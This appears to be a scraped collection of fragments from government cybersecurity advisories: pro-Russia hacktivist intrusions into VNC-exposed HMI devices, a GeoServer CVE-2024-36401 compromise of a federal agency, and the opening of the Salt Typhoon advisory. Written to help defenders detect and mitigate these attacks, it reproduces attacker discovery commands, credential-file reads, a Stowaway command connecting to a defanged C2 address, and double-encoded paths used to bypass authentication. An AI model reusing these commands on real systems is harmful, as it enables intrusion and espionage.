href=\"https://attack.mitre.org/versions/v18/techniques/T0829/\" target=\"_blank\" title=\"T0829\">T0829</a>]; and/or</li>\n<li>Device restart or shutdown [<a href=\"https://attack.mitre.org/versions/v18/techniques/T0816/\" target=\"_blank\" title=\"T0816\">T0816</a>].</li>\n</ul>\n</li>\n<li>Disconnect from the device, ending the VNC connection.</li>\n<li>Research the compromised device company after the intrusion [<a href=\"https://attack.mitre.org/versions/v18/techniques/T1591/\" target=\"_blank\" title=\"T1591\">T1591</a>].</li>\n</ul>\n<strong>Propagation</strong>\n<p>To reach a wider audience, pro-Russia hacktivist groups work together, amplify each other’s posts, create additional groups to amplify their own posts, and likely share TTPs. For example, Z-Pentest jointly claimed intrusion of a U.S. system with Sector16. Sector16 later began posting additional intrusions for which the group claimed sole responsibility. It is likely that these and similar groups will continue to iterate and share these methods to disrupt critical infrastructure organizations.</p>\n<strong>Reconnaissance and Initial Access</strong>\n<p>The threat actors’ intrusion methodology is relatively unsophisticated, inexpensive to execute, and easy to replicate. These pro-Russia hacktivist groups abuse popular internet-scraping tools, such as <code>Nmap</code> or <code>OPENVAS</code>, to search for visible VNC services and use brute force password spraying tools to access devices via known default or otherwise weak credentials. Threat actors typically search for these services on the default port <code>5900</code> or other nearby ports (<code>5901-5910</code>). Their goal is to gain remote access to HMI devices connected to live control networks.</p>\n<p>Once threat actors obtain access, they manipulate available settings from the graphical user interface (GUI) on the HMI devices, such as arbitrary physical parameter and setpoint changes, or conduct defacement activities. Because pro-Russia hacktivist groups seem to lack sector-specific expertise or cyber-physical engineering knowledge, they currently cannot reliably estimate the true impact of their actions. Regardless of outcome, pro-Russia hacktivist groups often post images and screen recordings to their social media platforms, boasting the compromises and exaggerating impacts to garner attention from their peers and the media.</p>\n<strong>Impact</strong>\n<p>While pro-Russia hacktivist groups currently demonstrate limited ability to consistently cause significant impact, there is a risk that their continued attacks will result in further harm or grievous physical consequences. Attacks have not yet caused injury; however, the attacks against occupied factories and community facilities demonstrate a lack of consideration for human safety.</p>\n<p>Victim organizations reported that the most common operational impact caused by these threat actors is a temporary loss of view, necessitating manual intervention to manage processes. However, any modifications to programmatic and systematic procedures can result in damage or disruption, including substantial labor costs from hiring a programmable logic controller programmer to restore operations, costs associated with operational downtime, and potential costs for network remediation.</p>\n<a><strong>MITRE ATT&amp;CK Tactics and Techniques</strong></a>\n<p>See <a href=\"https://www.cisa.gov/#Table1\" title=\"Table 1\"><strong>Table 1</strong></a> to <a href=\"https://www.cisa.gov/#Table10\" title=\"Table 10\"><strong>Table 10</strong></a> for all referenced threat actor tactics and techniques in this advisory.

These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"CPGs\">CPGs webpage</a> for more information on the CPGs, including additional recommended baseline protections.</p>\n<ul>\n<li><strong>Reduce exposure of OT assets to the public-facing internet.</strong> When connected to the internet, OT devices are easy targets for malicious cyber threat actors.

CISA is publicizing this advisory to reinforce the importance of prompt patching, as well as preparing for incidents by practicing incident response plans and by implementing logging and aggregating logs in a centralized out-of-band location. CISA is also raising awareness about the tactics, techniques, and procedures (TTPs) employed by these cyber threat actors to help organizations safeguard against similar exploits.</em></p>\n<p>CISA began incident response efforts at an FCEB agency after the agency identified potential malicious activity through security alerts generated by the agency’s endpoint detection and response (EDR) tool. CISA discovered cyber threat actors compromised the agency by exploiting <a href=\"https://www.cve.org/CVERecord?id=CVE-2024-36401\" target=\"_blank\" title=\"CVE-2024-36401\">CVE-2024-36401</a> in a GeoServer about three weeks prior to the EDR alerts. Over the three-week period, the cyber threat actors gained separate initial access to a second GeoServer via the same vulnerability and moved laterally to two other servers.</p>\n<p>Leveraging insights CISA gleaned from the organization’s security posture and response, CISA is sharing lessons learned for organizations to mitigate similar compromises (see <a href=\"https://www.cisa.gov/#Lessons%20Learned\" title=\"Lessons Learned\"><strong>Lessons Learned</strong></a> for more details):</p>\n<ol>\n<li><strong>Vulnerabilities were not promptly remediated.</strong>\n<ol>\n<li>The cyber threat actors exploited <a href=\"https://www.cve.org/CVERecord?id=CVE-2024-36401\" target=\"_blank\" title=\"CVE-2024-36401\">CVE-2024-36401</a> for initial access on two GeoServers.</li>\n<li>The vulnerability was disclosed 11 days prior to the cyber threat actors accessing the first GeoServer and 25 days prior to them accessing the second GeoServer.</li>\n</ol>\n</li>\n<li><strong>The agency did not test or exercise their incident response plan (IRP), nor did their IRP enable them to promptly engage third parties and grant third parties access to necessary resources.</strong>\n<ol>\n<li>This delayed certain elements of CISA’s response as the IRP did not have procedures for involving third-party assistance or for granting third-party access to their security tools.</li>\n</ol>\n</li>\n<li><strong>EDR alerts were not continuously reviewed, and some public-facing systems lacked endpoint protection.</strong>\n<ol>\n<li>The activity remained undetected for three weeks; the agency missed an opportunity to detect this activity earlier as they did not observe an alert from a GeoServer and the Web Server did not have endpoint protection.</li>\n</ol>\n</li>\n</ol>\n<p>These lessons highlight strategies to effectively mitigate risk, enhance preparedness, and respond to incidents with greater efficiency. CISA encourages all organizations to consider the lessons learned and apply the associated recommendations in the <a href=\"https://www.cisa.gov/#Mitigations\" title=\"Mitigations\"><strong>Mitigations</strong></a> section of this advisory to improve their security posture.</p>\n<p>This advisory also provides the cyber threat actors’ TTPs and indicators of compromise (IOCs).

This critical vulnerability, disclosed June 30, 2024, allows unauthenticated users to gain remote code execution (RCE) on affected GeoServer versions <a href=\"https://www.cisa.gov/#GeoServer\" title=\"Footnote Reference 1\">[1]</a>. The cyber threat actors used this vulnerability to download open source tools and scripts and establish persistence in the agency’s network. (CISA added this vulnerability to its <a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\" title=\"Known Exploited Vulnerabilities (KEV) Catalog\">Known Exploited Vulnerabilities (KEV) Catalog</a> on July 15, 2024.)</p>\n<p>After gaining initial access to GeoServer 1, the cyber threat actors gained separate initial access to a second GeoServer (GeoServer 2) on July 24, 2024, by exploiting the same vulnerability. They moved laterally from GeoServer 1 to a web server (Web Server) and then a Structured Query Language (SQL) server. On each server, they uploaded (or attempted to upload) web shells such as <a href=\"https://attack.mitre.org/software/S0020/\" target=\"_blank\" title=\"China Chopper\">China Chopper</a>, along with scripts designed for remote access, persistence, command execution, and privilege escalation. The cyber threat actors also used <a href=\"https://www.cisa.gov/resources-tools/resources/identifying-and-mitigating-living-land-techniques\" title=\"living off the land (LOTL)\">living off the land (LOTL)</a> techniques.</p>\n<p>See <a href=\"https://www.cisa.gov/#Figure%C2%A01.%20Overview%20of%20Threat%20Actor%20Activity\" title=\"Figure 1. Overview of Threat Actor Activity\"><strong>Figure 1</strong></a> for an overview of the cyber threat actors’ activity and the following sections for detailed threat actors TTPs.</p>\n<p><a>Figure 1. Overview of Threat Actor Activity</a></p>\n\n \n\n\nReconnaissance\n<p>The cyber threat actors identified <a href=\"https://www.cve.org/CVERecord?id=CVE-2024-36401\" target=\"_blank\" title=\"CVE-2024-36401\">CVE-2024-36401</a> in the organization’s public-facing GeoServer using Burp Suite Burp Scanner [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1595/002/\" target=\"_blank\" title=\"T1595.002\">T1595.002</a>]. CISA detected this scanning activity by analyzing web logs and identifying signatures associated with the tool. Specifically, CISA observed domains linked to Burp Collaborator—a component of Burp Suite used for vulnerability detection—originating from the same IP address the cyber threat actors later used to exploit the GeoServer vulnerability for initial access.</p>\nResource Development\n<p>The cyber threat actors used publicly available tools to conduct their malicious operations. In one instance, they gained remote access to the organization’s network and leveraged a commercially available virtual private server (VPS) from a cloud infrastructure provider [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1583/003/\" target=\"_blank\" title=\"T1583.003\">T1583.003</a>].</p>\nInitial Access\n<p>To gain initial access to GeoServer 1 and GeoServer 2, the cyber threat actors exploited <a href=\"https://www.cve.org/CVERecord?id=CVE-2024-36401\" target=\"_blank\" title=\"CVE 2024-36401\">CVE 2024-36401</a> [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1190/\" target=\"_blank\" title=\"T1190\">T1190</a>]. They leveraged this vulnerability to gain RCE by performing “eval injection,” a type of code injection that allows an untrusted user’s input to be evaluated as code. The cyber threat actors likely attempted to load a JavaScript extension to gain webserver information as an Apache wicket on GeoServer 1. However, their efforts were likely unsuccessful, as CISA observed attempts to access the <code>.js</code> file returning <code>404</code> responses in the web logs, indicating that the server could not find the requested URL.</p>\nPersistence\n<p>The cyber threat actors primarily used web shells [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1505/003/\" target=\"_blank\" title=\"T1505.003\">T1505.003</a>] on internet-facing hosts, along with <code>cron</code> jobs (scheduled commands that run automatically at specified times) [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1053/003/\" target=\"_blank\" title=\"T1053.003\">T1053.003</a>], and valid accounts [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1078/\" target=\"_blank\" title=\"T1078\">T1078</a>] for persistence. CISA also identified the creation of accounts—although these accounts were later deleted—with no evidence indicating further use.</p>\nPrivilege Escalation\n<p>The cyber threat actors attempted to escalate privileges with the publicly available dirtycow tool <a href=\"https://www.cisa.gov/#dirtycow\" title=\"Footnote Reference 2\">[2]</a>, which can be used to exploit <a href=\"https://www.cve.org/CVERecord?id=CVE-2016-5195\" target=\"_blank\" title=\"CVE-2016-5195\">CVE-2016-5195</a> [<a href=\"https://cwe.mitre.org/data/definitions/362.html\" target=\"_blank\" title=\"CWE-362: Race Condition\">CWE-362: “Race Condition”</a>] [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1068/\" target=\"_blank\" title=\"T1068\">T1068</a>]. After compromising web service accounts, they escalated their local privileges to transition away from these service accounts (it is unknown how they escalated privileges).</p>\n<p><strong>Note: </strong><a href=\"https://www.cve.org/CVERecord?id=CVE-2016-5195\" target=\"_blank\" title=\"CVE-2016-5195\">CVE-2016-5195</a> affects Linux kernel 2.x through 4.x before 4.8.3 and allows users to escalate privileges. CISA added this CVE to its KEV Catalog on March 3, 2022.</p>\nDefense Evasion\n<p>To evade detection, the cyber threat actors employed indirect command execution via <code>.php</code> web shells and <code>xp_cmdshell</code> [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1202/\" target=\"_blank\" title=\"T1202\">T1202</a>] and abused Background Intelligence Transfer Service (BITS) jobs [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1197/\" target=\"_blank\" title=\"T1197\">T1197</a>]. CISA also observed files on GeoServer 1 named <code>RinqQ.exe</code> and <code>RingQ.rar</code>, which likely refer to a publicly available defense evasion tool called RingQ <a href=\"https://www.cisa.gov/#RingQ\" title=\"Footnote Reference 3\">[3]</a>, that the cyber threat actors staged for potential use.</p>\n<p><strong>Note: </strong>CISA could not recover most of the files on the host to confirm their contents.</p>\nCredential Access\n<p>Once inside the organization’s network, the cyber threat actors primarily relied on brute force techniques [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1110/\" target=\"_blank\" title=\"T1110\">T1110</a>] to obtain passwords for lateral movement and privilege escalation. They also accessed service accounts by exploiting their associated services.</p>\nDiscovery\n<p>After gaining initial access, the cyber threat actors conducted discovery to facilitate lateral movement. They performed ping sweeps of hosts within specific subnets [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1018/\" target=\"_blank\" title=\"T1018\">T1018</a>] and downloaded the <code>fscan</code> tool <a href=\"https://www.cisa.gov/#fscan\" title=\"Footnote Reference 4\">[4]</a> to scan the organization’s network. CISA identified the use of the <code>fscan</code> tool by analyzing evidence of its output found on disk. (<strong>Note: </strong><code>fscan</code> is publicly available on GitHub and is capable of port scanning, fingerprinting, and web vulnerability detection—among other functions.) Between July 15 and 31, 2024, the cyber threat actors conducted extensive network and vulnerability scanning using <code>fscan</code> and <code>linux-exploit-suggester2.pl.</code> CISA’s host forensics analysts uncovered this activity by reviewing remnants the cyber threat actors left on disk.</p>\n<strong>GeoServer 1</strong>\n<p>The cyber threat actors leveraged <a href=\"https://www.cve.org/CVERecord?id=CVE-2024-36401\" target=\"_blank\" title=\"CVE-2024-36401\">CVE-2024-36401</a> to execute the following host discovery commands on GeoServer 1:</p>\n<ul>\n<li>uname-a</li>\n<li>df-h</li>\n<li>env</li>\n<li>ps -aux</li>\n<li>ipconfig [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1016/\" target=\"_blank\" title=\"T1016\">T1016</a>]</li>\n<li>date</li>\n<li>who -b</li>\n<li>rpm -qa polkit</li>\n<li>netstat -ano [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1049/\" target=\"_blank\" title=\"T1049\">T1049</a>]</li>\n</ul>\n<p>Additionally, they employed LOTL techniques for user, service, filesystem, and network discovery on GeoServer 1:</p>\n<ul>\n<li>cat /etc/passwd [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1087/001/\" target=\"_blank\" title=\"T1087.001\">T1087.001</a>]</li>\n<li>cat /etc/resolv.conf</li>\n<li>cat /usr/local/apache-tomcat-9.0.89/webapps/geoserver/WEB-INF/web.xml</li>\n<li>cat /etc/redhat-release [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1082/\" target=\"_blank\" title=\"T1082\">T1082</a>]</li>\n<li>cat /etc/os-release </li>\n</ul>\n<p>The cyber threat actors then used <code>curl</code> commands to download a shell script named <code>mm.sh</code> (which they renamed to <code>aa.sh</code>) and a zip file named <code>aaa.zip</code> to the <code>/tmp/</code> directory.</p>\n<p>Subsequently, they enumerated the internal network from GeoServer 1, identifying Secure Shell (SSH) listeners, File Transfer Protocol (FTP) servers, file servers, and web servers [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1046/\" target=\"_blank\" title=\"T1046\">T1046</a>] by using the <code>fscan</code> tool. (<strong>Note:</strong> CISA observed endpoint logs that showed the cyber threat actors uploaded <code>fscan</code> to the compromised host and ran it against internal systems.) The actors then attempted to brute force login credentials for the exploited web services to gain remote access, achieve RCE, or move laterally.</p>\n<p>The cyber threat actors also conducted ping sweeps of several hosts within the organization’s internal subnets using <code>fscan</code>. Their use of the <code>-nobr</code> and <code>-nopoc</code> flags for <code>fscan</code> indicated that this scan excluded brute forcing or vulnerability scanning, respectively.</p>\n<strong>SQL Server</strong>\n<p>CISA observed the following discovery commands on the organization’s SQL server:</p>\n<ul>\n<li>whoami [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1033/\" target=\"_blank\" title=\"T1033\">T1033</a>]</li>\n<li>ipconfig /all</li>\n<li>ping -n 1 8.8.8.8</li>\n<li>systeminfo</li>\n<li>tasklist [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1057/\" target=\"_blank\" title=\"T1057\">T1057</a>]</li>\n<li>dir c:\\ [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1083/\" target=\"_blank\" title=\"T1083\">T1083</a>]</li>\n<li>dir c:\\Users</li>\n<li>type c:\\Last.txt</li>\n<li>type c:\\inetpub\\wwwroot</li>\n<li>type c:\\inetpub\\</li>\n<li>dir c:\\inetpub\\wwwroot</li>\n<li>dir c:\\</li>\n<li>dir c:\\ifwapps</li>\n<li>dir d:\\</li>\n<li>dir e:\\</li>\n<li>net group \"domain admins\" /domain</li>\n<li>type C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config</li>\n<li>dir c:\\ifwapps\\Tier1Utilities</li>\n<li>netstat -ano</li>\n<li>curl</li>\n<li>net user</li>\n<li>tasklist</li>\n</ul>\n<strong>GeoServer 2</strong>\n<p>Based on images CISA received of GeoServer 2, CISA observed the bash history of a user that showed the use of Burp Collaborator to execute encoded host and network discovery commands.</p>\nLateral Movement\n<p>In one instance, the cyber threat actors moved laterally from the Web Server to the SQL Server by enabling <code>xp_cmdshell</code> for RCE on GeoServer 1.</p>\nCommand and Control\n<p>The cyber threat actors used PowerShell [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1059/001/\" target=\"_blank\" title=\"T1059.001\">T1059.001</a>] and <code>bitsadmin getfile</code> to download payloads [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1105/\" target=\"_blank\" title=\"T1105\">T1105</a>]. </p>\n<p>They used Stowaway <a href=\"https://www.cisa.gov/#Stowaway\" title=\"Footnote Reference 5\">[5]</a>, a publicly available multi-level proxy tool, to establish C2 [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1090/\" target=\"_blank\" title=\"T1090\">T1090</a>]. Stowaway enabled the cyber threat actors to bypass the organization’s intranet restrictions and access internal network resources by forwarding traffic from their C2 server through the Web Server. They wrote Stowaway to disk using a <code>tomcat</code> service account.</p>\n<p>The actors then executed Stowaway via <code>/var/tmp/agent -c 45.32.22[.]62:4441 -s f86bc7ff68aff3ad –up http –reconnect 10</code>.</p>\n<p>To test their level of access, the cyber threat actors performed a ping sweep of multiple hosts in a particular subnet of the organization’s network. Next, the cyber threat actors downloaded a modified version of Stowaway using a <code>curl</code> command, successfully establishing an outbound connection with their C2 server using <code>HTTP</code> over <code>TCP/4441</code>.</p>\n<p>On July 14, 2024, the cyber threat actors executed <code>/tmp/mm.sh</code> on the Web Server followed by an encoded command to execute Stowaway. The contents of this file could not be recovered. Additionally, they used Stowaway to establish a second C2 connection over <code>TCP/50012</code>, likely serving as a backup C2 channel.</p>\n<p>CISA discovered evidence of various files hosted on the C2 server, including numerous publicly available tools and scripts:</p>\n<ul>\n<li>RingQ antivirus defense evasion tool (<code>RingQ.exe</code>, <code>RingQ.rar</code>)</li>\n<li>IOX proxy tool (<code>iox.rar</code>)</li>\n<li>BusyBox trojan multi-tool (<code>busybox</code>)</li>\n<li>WinRAR archive tool (<code>Rar.exe</code>)</li>\n<li>Stowaway proxy tool (<code>agent</code>, <code>agent.tar</code>, <code>agent.zip</code>, <code>agentu.exe</code>)</li>\n<li>Web shells (<code>Handx.ashx</code>, <code>start_tomcat.jsp</code>)</li>\n<li>Various shell scripts (<code>mm.sh</code>, <code>t.py</code>, <code>t1.sh</code>, <code>c.bat</code>)</li>\n</ul>\nDetection\n<p>The cyber threat actors remained undetected in the organization’s environment for three weeks before the organization’s SOC identified the compromise using their EDR tool. On July 31, 2024, their EDR tool identified a <code>1.txt</code> file uploaded as suspected malware on the SQL Server. The SOC responded to additional alerts when the cyber threat actors transferred <code>1.txt</code> to the SQL Server through <code>bitsadmin</code> after attempting other LOTL techniques, such as leveraging PowerShell and <code>certutil</code>.

    "summary": "<strong>Executive summary</strong>\n<p>People’s Republic of China (PRC) state-sponsored cyber threat actors are targeting networks globally, including, but not limited to, telecommunications, government, transportation, lodging, and military infrastructure networks. While these actors focus on large backbone routers of major telecommunications providers, as well as provider edge (PE) and customer edge (CE) routers, they also leverage compromised devices and trusted connections to pivot into other networks. These actors often modify routers to maintain persistent, long-term access to networks. </p>\n<p>This activity partially overlaps with cyber threat actor reporting by the cybersecurity industry—commonly referred to as Salt Typhoon, OPERATOR PANDA, RedMike, UNC5807, and GhostEmperor, among others. The authoring agencies are not adopting a particular commercial naming convention and hereafter refer to those responsible for the cyber threat activity more generically as “Advanced Persistent Threat (APT) actors” throughout this advisory. This cluster of cyber threat activity has been observed in the United States, Australia, Canada, New Zealand, the United Kingdom, and other areas globally.</p>\n<p>This Cybersecurity Advisory (CSA) includes observations from various government and industry investigations where the APT actors targeted internal enterprise environments, as well as systems and networks that deliver services directly to customers. This CSA details the tactics, techniques, and procedures (TTPs) leveraged by these APT actors to facilitate detection and threat hunting, and provides mitigation guidance to reduce the risk from these APT actors and their TTPs.</p>\n<p>This CSA is being released by the following authoring and co-sealing agencies:</p>\n<ul>\n<li>United States National Security Agency (NSA)</li>\n<li>United States Cybersecurity and Infrastructure Security Agency (CISA)</li>\n<li>United States Federal Bureau of Investigation (FBI)</li>\n<li>United States Department of Defense Cyber Crime Center (DC3)</li>\n<li>Australian Signals Directorate’s Australian Cyber Security Centre (ASD’s ACSC)</li>\n<li>Canadian Centre for Cyber Security (Cyber Centre)</li>\n<li>Canadian Security Intelligence Service (CSIS)</li>\n<li>New Zealand National Cyber Security Centre (NCSC-NZ)</li>\n<li>United Kingdom National Cyber Security Centre (NCSC-UK)</li>\n<li>Czech Republic National Cyber and Information Security Agency (NÚKIB) - Národní úřad pro kybernetickou a informační bezpečnost</li>\n<li>Finnish Security and Intelligence Service (SUPO) - Suojelupoliisi</li>\n<li>Germany Federal Intelligence Service (BND) - Bundesnachrichtendienst</li>\n<li>Germany Federal Office for the Protection of the Constitution (BfV) -   Bundesamt für Verfassungsschutz</li>\n<li>Germany Federal Office for Information Security (BSI) - Bundesamt für Sicherheit in der Informationstechnik</li>\n<li>Italian External Intelligence and Security Agency (AISE) - Agenzia Informazioni e Sicurezza Esterna</li>\n<li>Italian Internal Intelligence and Security Agency (AISI) - Agenzia Informazioni e Sicurezza Interna</li>\n<li>Japan National Cybersecurity Office (NCO) - 国家サイバー統括室</li>\n<li>Japan National Police Agency (NPA) - 警察庁</li>\n<li>Netherlands Defence Intelligence and Security Service (MIVD) - Militaire Inlichtingen- en Veiligheidsdienst</li>\n<li>Netherlands General Intelligence and Security Service (AIVD) - Algemene Inlichtingen- en Veiligheidsdienst</li>\n<li>Polish Military Counterintelligence Service (SKW) - Służba Kontrwywiadu Wojskowego</li>\n<li>Polish Foreign Intelligence Agency (AW) - Agencja Wywiadu</li>\n<li>Spain National Intelligence Centre (CNI) - Centro Nacional de Inteligencia</li>\n</ul>\n<p>The authoring agencies strongly urge network defenders to hunt for malicious activity and to apply the mitigations in this CSA to reduce the threat of Chinese state-sponsored and other malicious cyber activity.</p>\n<p>Any mitigation or eviction measures listed within are subject to change as new information becomes available and ongoing coordinated operations dictate. Network defenders should ensure any actions taken in response to the CSA are compliant with local laws and regulations within the jurisdictions within which they operate. </p>\n<strong>Background</strong>\n<p>The APT actors have been performing malicious operations globally since at least 2021. These operations have been linked to multiple China-based entities, including at least Sichuan Juxinhe Network Technology Co. Ltd. (四川聚信和网络科技有限公司), Beijing Huanyu Tianqiong Information Technology Co., Ltd. (北京寰宇天穹信息技术有限公司), and Sichuan Zhixin Ruijie Network Technology Co., Ltd. (四川智信锐捷网络科技有限公司). These companies provide cyber-related products and services to China’s intelligence services, including multiple units in the People’s Liberation Army and Ministry of State Security. The data stolen through this activity against foreign telecommunications and Internet service providers (ISPs), as well as intrusions in the lodging and transportation sectors, ultimately can provide Chinese intelligence services with the capability to identify and track their targets’ communications and movements around the world.</p>\n<p>For more information on PRC state-sponsored malicious cyber activity, see <a href=\"https://www.cisa.gov/topics/cyber-threats-and-advisories/nation-state-cyber-actors/china\" title=\"CISA’s People's Republic of China Cyber Threat Overview and Advisories\">CISA’s People's Republic of China Cyber Threat Overview and Advisories</a> webpage.</p>\n<p><strong>Download the PDF version of this report:</strong></p>\n\n\n<a href=\"https://www.cisa.gov/sites/default/files/2025-09/CSA_COUNTERING_CHINA_STATE_ACTORS_COMPROMISE_OF_NETWORKS.pdf\" target=\"_blank\">CSA COUNTERING CHINA STATE ACTORS COMPROMISE OF NETWORKS</a>\n(PDF,       1.09 MB\n  )\n\n\n<p><strong>For a downloadable list of IOCs, visit:</strong></p>\n\n\n<a href=\"https://www.cisa.gov/sites/default/files/2025-09/AA25-239A_Countering_Chinese_State-Sponsored_Actors_Compromise_of_Networks_Worldwide_to_Feed_Global_Espionage_System.stix_.json\" target=\"_blank\">AA25-239A Countering Chinese State-Sponsored Actors Compromise of Networks to Feed Global Espionage System</a>\n(JSON,       86.01 KB\n  )\n\n\n\n\n<a href=\"https://www.cisa.gov/sites/default/files/2025-09/AA25-239A_Countering_Chinese_State-Sponsored_Actors_Compromise_of_Networks_Worldwide_to_Feed_Global_Espionage_System.stix_.xml\" target=\"_blank\">AA25-239A Countering Chinese State-Sponsored Actors Compromise of Networks to Feed Global Espionage System</a>\n(XML,       66.50 KB\n  )\n\n\n<strong>Cybersecurity Industry Tracking </strong>\n<p>The cybersecurity industry provides overlapping cyber threat intelligence, indicators of compromise (IOCs), and mitigation recommendations related to this Chinese state-sponsored cyber activity. While not all encompassing, the following are the most notable threat group names related to this activity and commonly used within the cybersecurity community:</p>\n<ul>\n<li>Salt Typhoon,</li>\n<li>OPERATOR PANDA,</li>\n<li>RedMike,</li>\n<li>UNC5807, and</li>\n<li>GhostEmperor. </li>\n</ul>\n<p><strong>Note</strong>: Cybersecurity companies have different methods of tracking and attributing cyber actors, and this may not be a 1:1 correlation to the authoring agencies’ understanding for all activity related to these groupings.</p>\n<strong>Technical details</strong>\n<p>The following sections are a compilation of TTPs the APT actors have used since at least 2021 to target enterprise environments. Particularly notable TTPs include modifying router configurations for lateral movement pivoting between networks and using virtualized containers on network devices to evade detection. The actors continue to use many of the TTPs listed, but expect them to evolve when existing TTPs no longer achieve their goals. Even if no longer used regularly, the actors may still use previous TTPs opportunistically in favorable conditions. The TTP descriptions can also be useful to network defenders for retroactive threat hunting.</p>\n<p><strong>Note</strong>: This advisory uses the <a href=\"https://attack.mitre.org/versions/v17/matrices/enterprise/\" target=\"_blank\" title=\"MITRE ATT&amp;CK® for Enterprise framework, version 17\">MITRE ATT&amp;CK® for Enterprise framework, version 17</a> and <a href=\"https://attack.mitre.org/versions/v17/matrices/ics/\" target=\"_blank\" title=\"MITRE ATT&amp;CK for ICS framework, version 17\">MITRE ATT&amp;CK for ICS framework, version 17</a>. See the <a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-239a#AppA\" title=\"Appendix A\">Appendix A: MITRE ATT&amp;CK Tactics and Techniques</a> section of this advisory for a table of the APT actors’ activity mapped to MITRE ATT&amp;CK tactics and techniques.</p>\nInitial access\n<p>Investigations associated with these APT actors indicate that they are having considerable success exploiting publicly known common vulnerabilities and exposures (CVEs) and other avoidable weaknesses within compromised infrastructure [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1190/\" target=\"_blank\" title=\"T1190\">T1190</a>]. Exploitation of zero-day vulnerabilities has not been observed to date. The APT actors will likely continue to adapt their tactics as new vulnerabilities are discovered and as targets implement mitigations, and will likely expand their use of existing vulnerabilities. The following list is not exhaustive and the authoring agencies suspect that the APT actors may target other devices (e.g., Fortinet firewalls, Juniper firewalls, Microsoft Exchange, Nokia routers and switches, Sierra Wireless devices, Sonicwall firewalls, etc.). </p>\n<p>If not yet patched, defenders should prioritize the following CVEs due to their historical exploitation on exposed network edge devices by these APT actors. Example exploited CVEs, ordered by year, include:</p>\n<ul>\n<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2024-21887\" target=\"_blank\" title=\"CVE-2024-21887\">CVE-2024-21887</a> - Ivanti Connect Secure and Ivanti Policy Secure web-component command injection vulnerability, commonly chained after CVE-2023-46805 (authentication bypass)</li>\n<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2024-3400\" target=\"_blank\" title=\"CVE-2024-3400\">CVE-2024-3400</a> - Palo Alto Networks PAN-OS GlobalProtect arbitrary file creation leading to OS command injection. The CVE allows for unauthenticated remote code execution (RCE) on firewalls when GlobalProtect is enabled on specific versions/configurations.</li>\n<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2023-20273\" target=\"_blank\" title=\"CVE-2023-20273\">CVE-2023-20273</a> - Cisco Internetworking Operating System (IOS) XE software web management user interface post-authentication command injection/privilege escalation (commonly chained with CVE-2023-20198 for initial access to achieve code execution as root) [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1068/\" target=\"_blank\" title=\"T1068\">T1068</a>]</li>\n<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2023-20198\" target=\"_blank\" title=\"CVE-2023-20198\">CVE-2023-20198</a> - Cisco IOS XE web user interface authentication bypass vulnerability\n<ul>\n<li>While exploiting CVE-2023-20198, the APT actors used the Web Services Management Agent (WSMA) endpoints <code>/webui_wsma_Http</code> or <code>/webui_wsma_Https</code> to bypass authentication and create unauthorized administrative accounts. In some cases, the APT actors obfuscated requests by “double encoding” portions of the path, e.g., <code>/%2577eb%2575i_%2577sma_Http</code> or <code>/%2577eb%2575i_%2577sma_Https</code> [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1027/010/\" target=\"_blank\" title=\"T1027.010\">T1027.010</a>]. Observed requests varied in case, so hunting and detection should be case-insensitive and tolerant of over-encoding.</li>\n<li>After patching this CVE, WSMA endpoints requests are internally proxied, and the system adds a <code>Proxy-Uri-Source HTTP</code> header as part of the remediation logic. The presence of <code>Proxy-Uri-Source</code> header in traffic to <code>/webui_wsma_*</code> indicates a patched device handling the request, not exploitation. This can help distinguish between vulnerable and remediated systems when analyzing logs or captures.</li>\n</ul>\n</li>\n<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2018-0171\" target=\"_blank\" title=\"CVE-2018-0171 \">CVE-2018-0171</a> - Cisco IOS and IOS XE smart install remote code execution vulnerability</li>\n</ul>\n<p>The APT actors leverage infrastructure, such as virtual private servers (VPSs) [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1583/003/\" target=\"_blank\" title=\"T1583.003\">T1583.003</a>] and compromised intermediate routers [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1584/008/\" target=\"_blank\" title=\"T1584.008\">T1584.008</a>], that have not been attributable to a publicly known botnet or obfuscation network infrastructure to target telecommunications and network service providers, including ISPs [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1090/\" target=\"_blank\" title=\"T1090\">T1090</a>]. </p>\n<p>The APT actors may target edge devices regardless of who owns a particular device. Devices owned by entities who do not align with the actors’ core targets of interest still present opportunities for use in attack pathways into targets of interest. The actors leverage compromised devices and trusted connections or private interconnections (e.g., provider-to-provider or provider-to-customer links) to pivot into other networks [<a 